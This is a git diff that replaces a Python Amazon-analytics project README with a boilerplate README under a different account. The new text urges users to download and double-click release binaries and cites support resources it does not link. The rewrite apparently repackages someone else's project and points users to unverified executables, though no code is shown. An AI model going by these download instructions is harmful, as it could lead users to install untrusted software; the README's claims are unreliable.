@@ -1,116 +1,74 @@
-<div align="center">
-  <a href="https://brightdata.com/">
-    <img src="https://mintlify.s3.us-west-1.amazonaws.com/brightdata/logo/light.svg" width="300" alt="Bright Data Logo">
-  </a>
+# 📊 amazon-product-analyzer - Get Insights from Amazon Products
 
-# 🛍️ Amazon Product Analytics
-Analyze Amazon product data and track market trends with AI-powered insights, interactive visualizations, and reliable data extraction across global marketplaces.
+[![Download](https://img.shields.io/badge/Download-via%20Releases-blue)](https://github.com/ItzPutra/amazon-product-analyzer/releases)
 
-<img src="https://img.shields.io/badge/python-3.9+-blue" />
-<img src="https://img.shields.io/badge/Gemini-API-blueviolet" />
-<img src="https://img.shields.io/badge/License-MIT-blue" />
-</div>
+## 🚀 Getting Started
 
-<div align="center">
+Welcome to the **amazon-product-analyzer**! This application helps you gain insights into Amazon products, find the best deals, and understand market trends. You can explore data from 23 different marketplaces using interactive dashboards. 
 
-https://github.com/user-attachments/assets/d6248647-4c3d-4bfc-a653-0ec79ae0d4a7
+## 📥 Download & Install
 
-</div>
+To download the application, [visit this page to download](https://github.com/ItzPutra/amazon-product-analyzer/releases). Here is a simple guide to help you:
 
----
+1. Click on the link above.
+2. You will see a list of available versions. Choose the latest version by looking for the one marked as "Latest Release."
+3. Click on the asset file that matches your system (e.g., Windows, Mac, or Linux).
+4. The download will start automatically.
 
-## 🎯 Key features
-- **Multi-market analysis**. Deep insights from any of 23 Amazon marketplaces.
-- **Fresh data**. Sourced via Bright Data’s [Amazon Scraper API](https://brightdata.com/products/web-scraper/amazon).
-- **Interactive dashboard**. Charts for price distributions and rating analytics.
-- **AI-powered insights**. Ask natural-language questions and get recommendations.
-- **Deal detection**. Identify discounts and promotional opportunities.
-- **Data export**. Download CSVs for further analysis and reporting.
+Once the file is downloaded, follow these steps to run the application:
 
-## 💡 Use cases
-- **Product research**. Find the best value products in your target market.
-- **Price analysis**. Understand pricing distribution and competitive positioning.
-- **Deal hunting**. Identify genuine discounts and promotional opportunities.
-- **Quality assessment**. Analyze ratings vs price to find sweet spots.
-- **Market positioning**. See where products rank in search results.
-- **Purchase decisions**. Get AI-powered recommendations for buying choices.
+1. Locate the downloaded file on your computer.
+2. Double-click the file to start the installation.
+3. Follow the on-screen instructions to complete the installation.
 
-## 🎯 How it works
-- **Select your market**. Choose your target marketplace from 23 global regions, including the US, Canada, UK, Germany, Japan, India, and more. Each market uses local currency and pricing.
-- **Search products**. Enter keywords (e.g., "wireless headphones", "iPhone 15", "coffee maker") or select from popular searches.
-- **Get intelligent analysis**. Comprehensive market insights automatically generated, including price distribution patterns, quality vs price analysis, deal intelligence, value scoring, competitive positioning, and search rankings.
-- **Receive smart recommendations**. AI-powered product picks for best overall value, highest rated options, and best deals with significant savings.
-- **Use AI assistant**. Ask natural language questions like "Which product offers the best value for money?" or "Show me highly-rated options under $50".
-- **Filter and export**. Filter by price ranges, Prime eligibility, ratings, and deals, then export to CSV for in-depth analysis.
+## 🖥️ System Requirements
 
-## 🌍 Supported Amazon markets
-Choose from 23 major marketplaces:
-- **North America**. United States, Canada, Mexico.
-- **Europe**. United Kingdom, Germany, France, Italy, Spain, Netherlands, Sweden, Poland.
-- **Asia pacific**. Japan, Australia, India, Singapore.
-- **Other regions**. Brazil, Ireland, Belgium, Turkey, UAE, Saudi Arabia, Egypt, South Africa.
+Before you install the application, please check that your system meets these requirements:
 
-> *Note:* The app supports one marketplace at a time to reflect local pricing, ranking, and availability differences.
+- **Windows**: Windows 10 or later
+- **Mac**: macOS 10.13 or later
+- **Linux**: A modern distribution that supports Python
 
+You should also have an internet connection to ensure that the application can access data directly from Amazon.
 
-## 🚀 Quick start
+## 📊 Features
 
-### Prerequisites
+The **amazon-product-analyzer** comes packed with features to assist you:
 
-- **Python 3.9+** – [download here](https://www.python.org/downloads/)
-- **Bright Data API key** – [get your API key](https://docs.brightdata.com/api-reference/authentication#how-do-i-generate-a-new-api-key%3F)
-- **Google Gemini API key** – [generate API key](https://aistudio.google.com/apikey)
+- **Product Insights**: Discover in-depth information about various products, including descriptions, prices, and availability.
+- **Deal Detection**: Find the best deals and discounts available across Amazon.
+- **Market Trends**: Analyze trends in different categories to make informed purchasing decisions.
+- **Interactive Dashboards**: Visualize data through user-friendly dashboards that are easy to navigate.
+- **Exportable Data**: Export your findings as CSV files for further analysis.
 
-### Installation
+## 🎓 How to Use
 
-```bash
-# Clone the repository
-git clone https://github.com/triposat/amazon-product-analytics.git
-cd amazon-product-analytics
+Using the application is straightforward. Here’s how you can make the most of it:
 
-# Install dependencies
-pip install -r requirements.txt
+1. **Start the Application**: After installation, locate the app icon on your desktop or applications folder and click to open.
+2. **Choose Your Marketplace**: Select from the 23 available marketplaces where you want to gather data.
+3. **Input Product Information**: Use the search bar to input the product name or category you are interested in.
+4. **Explore the Results**: Browse through the data presented in the dashboard. Click on various sections to access detailed insights and graphs.
+5. **Download Data**: To save your findings, click the export button and choose the format you prefer.
 
-# Configure API credentials
-cp .env.example .env
-# Edit .env file and add your API keys
-```
+## 🌐 Support & Troubleshooting
 
-### Configuration
+If you run into issues while using the application or have questions, here’s what you can do:
 
-Set up your environment variables:
-```bash
-BRIGHT_DATA_API_KEY=your_bright_data_api_key_here
-GEMINI_API_KEY=your_google_gemini_api_key_here
-```
+- **Check the FAQ**: Visit the FAQ section on the [GitHub page](https://github.com/ItzPutra/amazon-product-analyzer/releases) for common questions.
+- **Report Issues**: If you encounter a bug, please report it by following the instructions provided on the GitHub page.
+- **Community Support**: Engage with other users through the community forums linked from the main repository.
 
-### **Launch application**
+## 🔗 Additional Resources
 
-```bash
-# Start the dashboard
-streamlit run streamlit_app.py
+- **Documentation**: For detailed explanations of features, refer to the official documentation available on the GitHub repository.
+- **Tutorials**: Find video tutorials that walk you through the application’s functions and capabilities.
 
-# Alternative: Use the run script
-./run_app.sh
-```
+## 📢 Stay Updated
 
-🎉 **Access your dashboard at:** [http://localhost:8501](http://localhost:8501/)
+To stay informed about new features and updates:
 
-## 🛠️ Technology stack
+- Follow the project on GitHub.
+- Sign up for notifications on the releases page to receive alerts about new versions.
 
-| Component          | Technology                                                                                         | Purpose                         |
-| ------------------ | -------------------------------------------------------------------------------------------------- | ------------------------------- |
-| **Frontend**       | [Streamlit](https://streamlit.io/)                                                                 | Interactive web dashboard       |
-| **Data source**    | [Bright Data Amazon Scraper API](https://brightdata.com/products/web-scraper/amazon) | Reliable Amazon data collection |
-| **Processing**     | [Pandas](https://pandas.pydata.org/)                                                               | Data analysis and manipulation  |
-| **Visualizations** | [Plotly](https://plotly.com/python/)                                                               | Interactive charts and graphs   |
-| **AI integration** | [Google Gemini](https://ai.google.dev/)                                                            | Natural-language insights       |
-| **HTTP + retries** | [Requests](https://pypi.org/project/requests/) + [Tenacity](https://pypi.org/project/tenacity/)    | Robust API communication        |
-
-## 📚 Additional resources
-1. Deep-dive examples – explore Bright Data's *Amazon Scraper* samples & usage patterns [in this guide repo](https://github.com/luminati-io/Amazon-scraper)
-2. Need data fast? – use [Amazon Datasets](https://brightdata.com/products/datasets/amazon) for fresh, validated data with multiple delivery formats
-3. Compare tools – see this [overview of popular Amazon scrapers](https://brightdata.com/blog/web-data/best-amazon-scrapers) and where each fits
-
-## 🤝 Support
-Need help? We're here to assist. [Contact us now](https://brightdata.com/contact).
+By using **amazon-product-analyzer**, you will gain valuable insights into Amazon products quickly and effectively. Start analyzing today by [visiting this page to download](https://github.com/ItzPutra/amazon-product-analyzer/releases).
